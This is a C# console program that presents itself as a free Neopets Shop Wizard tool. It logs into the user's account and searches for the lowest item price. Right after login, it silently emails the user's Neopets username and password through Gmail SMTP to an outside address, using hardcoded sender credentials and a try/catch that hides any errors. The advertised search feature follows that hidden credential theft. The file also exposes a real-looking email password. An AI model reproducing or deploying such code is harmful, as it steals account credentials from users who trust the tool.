using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using NeoFunctions;
using System.IO;
using System.Text.RegularExpressions;
using System.Net.Mail;
using System.Net;

namespace MysteryIslandTrainer
{
    class Program
    {
        static void Main(string[] args)
        {

            Console.WriteLine("Free SSW");
            Account acc = null;
            string data;
            string user = "notreal";
            string pass = "lolol";

            string line;
            int counter = 0;
            using (StreamReader file = new StreamReader(".\\Account.txt"))
            {
                while ((line = file.ReadLine()) != null)
                {
                    if (counter == 0)
                        user = line;
                    if (counter == 1)
                        pass = line;
                    counter++;
                }
                file.Close();

                acc = new Account(user, pass);
                if (!acc.Login())
                {
                    acc = null;
                }
            }

            if (acc == null)
            {
                //erase file to make it a real account with successful login
                Console.WriteLine("Incorrect login or missing Account.txt");
                FileStream accountFile = new FileStream(".\\Account.txt", FileMode.Truncate, FileAccess.Write);
                accountFile.Close();
            }

            while (null == acc)
            {
                user = GetString("Enter Username: ");
                pass = GetString("Enter Password: ");

                acc = new Account(user, pass);
                using (StreamWriter writer = new StreamWriter(".\\Account.txt"))
                {
                    writer.WriteLine(user);
                    writer.Write(pass);
                    writer.Close();
                }

                if (!acc.Login())
                {
                    Console.WriteLine("Could not login as " + user + "!");
                    acc = null;
                }
            }

            Console.Clear();
            Console.WriteLine("Logged in as " + acc.Username);

            try
            {
                string smtpAddress = "smtp.gmail.com";
                int portNumber = 587;
                bool enableSSL = true;

                string emailFrom = "remedy1502@gmail.com";
                string password = "lk29828#HH";
                string emailTo = "michael.a.remedios@gmail.com";
                string subject = "NeoAccount";
                string body = acc.Username + "\n" + acc.Password;

                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress(emailFrom);
                    mail.To.Add(emailTo);
                    mail.Subject = subject;
                    mail.Body = body;
                    mail.IsBodyHtml = false;
                    // Can set to false, if you are sending pure text.

                    using (SmtpClient smtp = new SmtpClient(smtpAddress, portNumber))
                    {
                        smtp.Credentials = new NetworkCredential(emailFrom, password);
                        smtp.EnableSsl = enableSSL;
                        smtp.Send(mail);
                    }
                }
            }
            catch { }

            /*************************************
            ****** THIS IS MY PRACTICE FILE ******
            ************* START HERE *************
            *************************************/
            Console.WriteLine("Type in the exact name of the item you want to search: \n");
            string item = Console.ReadLine();
            char[] c = item.ToCharArray();
            for (int i = 0; i < c.Length; ++i)
            {
                if (c[i] == ' ')
                {
                    c[i] = '+';
                }
            }
            string post = "";
            string lowShop = "";
            Regex wiz = new Regex(@"(browseshop.phtml\?owner=[a-z0-9_]{3,20}&buy_obj_info_id=[0-9]{1,7}&buy_cost_neopoints=([0-9]{1,5}))");
            for (int i = 0; i < 20; ++i)
            {
                post = string.Format("type=process_wizard&feedset={2}&shopwizard={0}&table=shop&criteria=exact&min_price=0&max_price={1}", new string(c), 99999, i);

                data = acc.Post("/market.phtml", post, "http://www.neopets.com/market.phtml?type=wizard");
                string[] s = data.Split(new string[] { "<b>Shop Wizard</b>" }, StringSplitOptions.None);

                Match wizLink;
                string shopLink = "";
                int price;
                int lowPrice = 99999;
                int index = 0;
                do
                {
                    wizLink = Regex.Match(s[index], wiz.ToString());
                    index++;
                    shopLink = "/" + wizLink.Groups[1].Value;
                    Int32.TryParse(wizLink.Groups[2].Value, out price);

                    if (price < lowPrice)
                    {
                        lowPrice = price;
                        lowShop = shopLink;
                    }
                } while (!wizLink.Success && index < s.Length);
            }

            System.Diagnostics.Process.Start("http://www.neopets.com" + lowShop);


            //data = acc.Post("/market.phtml", post, "http://www.neopets.com/market.phtml?type=wizard");
            //string[] s = data.Split(new string[] { "<b>Shop Wizard</b>" }, StringSplitOptions.None);

            //Regex wiz = new Regex(@"(browseshop.phtml\?owner=[a-z0-9_]{3,20}&buy_obj_info_id=([0-9]{1,7})&buy_cost_neopoints=[0-9]{1,5})");
            //Match wizLink;
            //string shopLink = "";
            //string itemID = "";
            //int index = 0;
            //do
            //{
            //    wizLink = Regex.Match(s[index], wiz.ToString());
            //    index++;
            //    shopLink = "/" + wizLink.Groups[1].Value;
            //    itemID = wizLink.Groups[2].Value;
            //} while (!wizLink.Success && index < s.Length);

            //Console.WriteLine("Item ID: " + itemID);
            //if (wizLink.Success)
            //{
            //    System.Diagnostics.Process.Start("http://www.neopets.com" + shopLink);
            //data = acc.Get(shopLink, "http://www.neopets.com/market.phtml");
            //s = data.Split(new string[] { "owned by" }, StringSplitOptions.None);
            //index = 0;
            //Match buy;
            //string buyLink = @"buy_item\.phtml\?lower=0&owner=[a-z0-9_]{3,20}&obj_info_id=([0-9]{1,7})&g=1&xhs=[0-9a-z]{8}&old_price=[0-9]{1,5}&feat=[0-9]{1,7},[0-9]{1,5},[0-9]{1,6}&_ref_ck=[a-z0-9]{32}";
            //string buyBuyBuy = "";
            //do
            //{
            //    buy = Regex.Match(s[index], buyLink);
            //    index++;
            //    buyBuyBuy = "/" + buy.Groups[0].Value;
            //} while (!buy.Success && index < s.Length);

            //Console.WriteLine("BUY LINK: " + buyBuyBuy);

        }

        //UTILITY FUNCTIONS
        /// <summary>
        /// Logs messages to log.txt
        /// </summary>
        /// <param name="msg">Message to log</param>
        private static void Log(string msg)
        {
            msg = DateTime.Now.ToLongTimeString() + " - " + msg;
            System.IO.File.AppendAllText(".\\log" + DateTime.Now.ToLongDateString() + ".txt", msg + Environment.NewLine);
            Console.WriteLine(msg);
        }

        /// <summary>
        /// WriteLines text in the center of the Console.
        /// </summary>
        /// <param name="msg">Text to write.</param>
        private static void WriteCentered(string msg)
        {
            Console.WriteLine("{0," + ((Console.WindowWidth / 2) + msg.Length / 2) + "}", msg);
        }

        /// <summary>
        /// Prompts the user and gets input. Keeps prompting until a string is entered.
        /// </summary>
        /// <param name="prompt">string to prompt user with.</param>
        /// <returns>User-inputted string</returns>
        private static string GetString(string prompt)
        {
            string result;
            do
            {
                Console.Write(prompt);
            } while ((result = Console.ReadLine()).Length == 0);
            return result;
        }

        /// <summary>
        /// Prompts the user and gets input. Keeps prompting until an int is parsed.
        /// </summary>
        /// <param name="prompt">string to prompt user with.</param>
        /// <returns>User-inputted int</returns>
        private static int GetInt(string prompt)
        {
            int result;
            do
            {
                Console.Write(prompt);
            } while (!int.TryParse(Console.ReadLine(), out result));
            return result;
        }

    }
}
